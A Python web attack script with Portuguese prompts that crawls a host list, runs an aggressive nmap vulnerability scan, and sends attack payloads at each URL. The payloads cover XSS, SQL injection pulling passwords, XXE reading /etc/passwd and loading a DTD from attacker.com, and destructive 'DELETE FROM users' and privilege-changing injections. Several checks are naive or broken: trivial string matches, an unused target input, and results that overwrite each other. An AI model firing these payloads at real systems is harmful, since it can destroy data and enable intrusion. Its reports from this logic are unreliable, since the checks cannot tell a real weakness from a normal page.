import os
import requests
from bs4 import BeautifulSoup, Comment
import nmap

def load_dns_list():
    with open("dns.txt", "r") as file:
        dns_list = file.read().splitlines()
    return dns_list

def load_directories_list():
    with open("diretorios.txt", "r") as file:
        directories = file.read().splitlines()
    return directories

def enumerate_directories(dns_list, protocol):
    all_directories = []
    for dns in dns_list:
        url = f"{protocol}://{dns}"
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a')
            for link in links:
                directory = link.get('href')
                if directory and directory.startswith('/'):
                    all_directories.append(f"{protocol}://{dns}{directory}")
        except:
            pass
    return all_directories

def separate_comments(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            print("Comentário encontrado:", comment)
    except:
        pass

def enumerate_ports(dns_list, protocol, responses=""):
    nm = nmap.PortScanner()
    for dns in dns_list:
        nm.scan(dns, arguments='-p 1-65535 -sV -Pn --script vuln')
        print(f"\n[+] DNS: {dns} [{protocol.upper()}]\n")
        for host in nm.all_hosts():
            print('IP:', host)
            print('Portas abertas:')
            for port in nm[host]['tcp']:
                if not responses or nm[host]['tcp'][port]['state'] in responses:
                    print('Porta:', port, ' - Estado:', nm[host]['tcp'][port]['state'])
                    print('   Serviço:', nm[host]['tcp'][port]['name'])
                    print('   Versão:', nm[host]['tcp'][port]['version'])
                    print('   Vulnerabilidades:', nm[host]['tcp'][port]['script'])

                    # Escrever informações no arquivo de texto
                    with open("resultado_geral.txt", "a") as file:
                        file.write(f"IP: {host}\n")
                        file.write(f"Porta: {port} - Estado: {nm[host]['tcp'][port]['state']}\n")
                        file.write(f"   Serviço: {nm[host]['tcp'][port]['name']}\n")
                        file.write(f"   Versão: {nm[host]['tcp'][port]['version']}\n")
                        file.write(f"   Vulnerabilidades: {nm[host]['tcp'][port]['script']}\n")
            # Adicionar IP no arquivo de texto de informações
            with open("resultado_geral.txt", "a") as file:
                file.write(f"\n[+] DNS: {dns} [{protocol.upper()}]\n")
                file.write(f"IP: {host}\n\n")

def vulnerability_analysis(directories):
    vulnerabilities = []
    for directory in directories:
        vulnerabilities += test_xss(directory)
        vulnerabilities += test_sql_injection(directory)
        vulnerabilities += test_csrf(directory)
        vulnerabilities += test_insecure_deserialization(directory)
        vulnerabilities += test_sensitive_data_exposure(directory)
        vulnerabilities += test_xml_external_entities(directory)
        vulnerabilities += test_broken_access_control(directory)
        vulnerabilities += test_security_misconfiguration(directory)
        vulnerabilities += test_injection_flaws(directory)
        vulnerabilities += test_components_with_known_vulnerabilities(directory)
    return vulnerabilities

def test_xss(url):
    vulnerabilities = []
    try:
        response = requests.get(url + '/<script>alert("XSS1")</script>')
        if "<script>alert(" in response.text:
            vulnerabilities.append(("XSS", url))

        response = requests.get(url + '?param=<script>alert("XSS2")</script>')
        if "<script>alert(" in response.text:
            vulnerabilities.append(("XSS", url))

        response = requests.get(url + '?param=<img src="javascript:alert(\'XSS3\')">')
        if "javascript:alert('XSS3')" in response.text:
            vulnerabilities.append(("XSS", url))
    except:
        pass
    return vulnerabilities

def test_sql_injection(url):
    vulnerabilities = []
    try:
        response = requests.get(url + "/?id=1'")
        if "SQL syntax" in response.text:
            vulnerabilities.append(("SQL Injection", url))

        response = requests.get(url + "/?id=1 OR 1=1")
        if "SQL syntax" in response.text:
            vulnerabilities.append(("SQL Injection", url))

        response = requests.get(url + "/?id=-1 UNION SELECT password FROM users")
        if "password" in response.text:
            vulnerabilities.append(("SQL Injection", url))
    except:
        pass
    return vulnerabilities

def test_csrf(url):
    vulnerabilities = []
    try:
        payload = {'username': 'admin', 'password': 'password', 'action': 'delete'}
        response = requests.post(url, data=payload)
        if "Deletar usuário" in response.text:
            vulnerabilities.append(("CSRF", url))

        response = requests.get(url + '?action=delete')
        if "Deletar usuário" in response.text:
            vulnerabilities.append(("CSRF", url))

        payload = {'username': 'admin', 'password': 'password', 'action': 'transfer_funds'}
        response = requests.post(url, data=payload)
        if "Transferir fundos" in response.text:
            vulnerabilities.append(("CSRF", url))
    except:
        pass
    return vulnerabilities

def test_insecure_deserialization(url):
    vulnerabilities = []
    try:
        serialized_data = '{"username": "admin", "role": "user", "is_admin": false}'
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=serialized_data, headers=headers)
        if "admin" in response.text:
            vulnerabilities.append(("Insecure Deserialization", url))

        serialized_data = '{"username": "admin", "role": "user", "is_admin": true}'
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=serialized_data, headers=headers)
        if "admin" in response.text:
            vulnerabilities.append(("Insecure Deserialization", url))

        serialized_data = '{"username": "admin", "role": "admin", "is_admin": true}'
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=serialized_data, headers=headers)
        if "admin" in response.text:
            vulnerabilities.append(("Insecure Deserialization", url))
    except:
        pass
    return vulnerabilities

def test_sensitive_data_exposure(url):
    vulnerabilities = []
    try:
        response = requests.get(url + "/config/credentials.txt")
        if "password" in response.text:
            vulnerabilities.append(("Sensitive Data Exposure", url))

        response = requests.get(url + "/logs/access.log")
        if "admin" in response.text:
            vulnerabilities.append(("Sensitive Data Exposure", url))

        response = requests.get(url + "/backup/db_backup.sql")
        if "INSERT INTO users" in response.text:
            vulnerabilities.append(("Sensitive Data Exposure", url))
    except:
        pass
    return vulnerabilities

def test_xml_external_entities(url):
    vulnerabilities = []
    try:
        payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url, data=payload, headers=headers)
        if "root:x:0:0:root:/root" in response.text:
            vulnerabilities.append(("XML External Entities (XXE)", url))

        payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%init;%trick;]><root></root>'
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url, data=payload, headers=headers)
        if "Hacked!" in response.text:
            vulnerabilities.append(("XML External Entities (XXE)", url))

        payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "/etc/passwd">]><data>&file;</data>'
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url, data=payload, headers=headers)
        if "root:x:0:0:root:/root" in response.text:
            vulnerabilities.append(("XML External Entities (XXE)", url))
    except:
        pass
    return vulnerabilities

def test_broken_access_control(url):
    vulnerabilities = []
    try:
        response = requests.get(url + "/admin-panel")
        if "Admin Panel" in response.text:
            vulnerabilities.append(("Broken Access Control", url))

        payload = {'username': 'user', 'password': 'password'}
        response = requests.post(url + "/login", data=payload)
        response = requests.get(url + "/admin-panel")
        if "Admin Panel" in response.text:
            vulnerabilities.append(("Broken Access Control", url))

        response = requests.get(url + "/user-data?id=123")
        if "User Data" in response.text:
            vulnerabilities.append(("Broken Access Control", url))
    except:
        pass
    return vulnerabilities

def test_security_misconfiguration(url):
    vulnerabilities = []
    try:
        response = requests.get(url + "/uploads/")
        if "Index of /uploads" in response.text:
            vulnerabilities.append(("Security Misconfiguration", url))

        response = requests.get(url + "/admin")
        if "Fatal error: Uncaught Exception" in response.text:
            vulnerabilities.append(("Security Misconfiguration", url))

        response = requests.get(url + "/source_code.php")
        if "DEBUG_MODE = true" in response.text:
            vulnerabilities.append(("Security Misconfiguration", url))
    except:
        pass
    return vulnerabilities

def test_injection_flaws(url):
    vulnerabilities = []
    try:
        response = requests.get(url + "?search=admin; DELETE FROM users")
        if "User Deleted" in response.text:
            vulnerabilities.append(("Injection Flaws", url))

        response = requests.get(url + "?id=123; UPDATE users SET role=admin")
        if "Role Updated" in response.text:
            vulnerabilities.append(("Injection Flaws", url))

        response = requests.get(url + "?id=123; SELECT * FROM users WHERE role=admin")
        if "Admin User" in response.text:
            vulnerabilities.append(("Injection Flaws", url))
    except:
        pass
    return vulnerabilities

def test_components_with_known_vulnerabilities(url):
    vulnerabilities = []
    try:
        response = requests.get(url + "/vendor/jquery/jquery.js")
        if "jQuery v3.4.1" in response.text:
            vulnerabilities.append(("Components with Known Vulnerabilities", url))

        response = requests.get(url + "/plugins/calendar/calendar.js")
        if "Calendar Plugin v1.2.3" in response.text:
            vulnerabilities.append(("Components with Known Vulnerabilities", url))

        response = requests.get(url + "/services/mysql.php")
        if "MySQL Connector v2.1.0" in response.text:
            vulnerabilities.append(("Components with Known Vulnerabilities", url))
    except:
        pass
    return vulnerabilities

def main():
    alvo = input("ALVO - DOMINO: ")
    protocolo = input("PROTOCOLO - (1 - HTTP, 2 - HTTPS): ")
    if protocolo == "1":
        protocolo = "http"
    elif protocolo == "2":
        protocolo = "https"
    else:
        print("Opção inválida. Usando HTTP como padrão.")
        protocolo = "http"

    responses = input("REQUISIÇÃO - separado por virgula - (200,403): ")
    responses = responses.split(',') if responses else []

    dns_list = load_dns_list()

    print("\n[+] Enumerando diretórios...")
    enumerated_directories = enumerate_directories(dns_list, protocolo)

    print("\n[+] Separando comentários de páginas HTTP...")
    for directory in enumerated_directories:
        separate_comments(directory)

    print("\n[+] Enumerando portas...")
    enumerate_ports(dns_list, protocolo, responses)

    print("\n[+] Analisando vulnerabilidades...")
    vulnerabilities = vulnerability_analysis(enumerated_directories)

    with open("resultado_geral.txt", "w") as file:
        file.write("Informações:\n")
        file.write(f"Alvo: {alvo}\n")
        file.write("DNS:\n")
        for dns in dns_list:
            file.write(f"- {dns}\n")
        file.write("Diretórios:\n")
        for directory in enumerated_directories:
            file.write(f"- {directory}\n")
        file.write("Vulnerabilidades:\n")
        for vulnerability in vulnerabilities:
            file.write(f"- {vulnerability[0]} - {vulnerability[1]}\n")

if __name__ == "__main__":
    main()
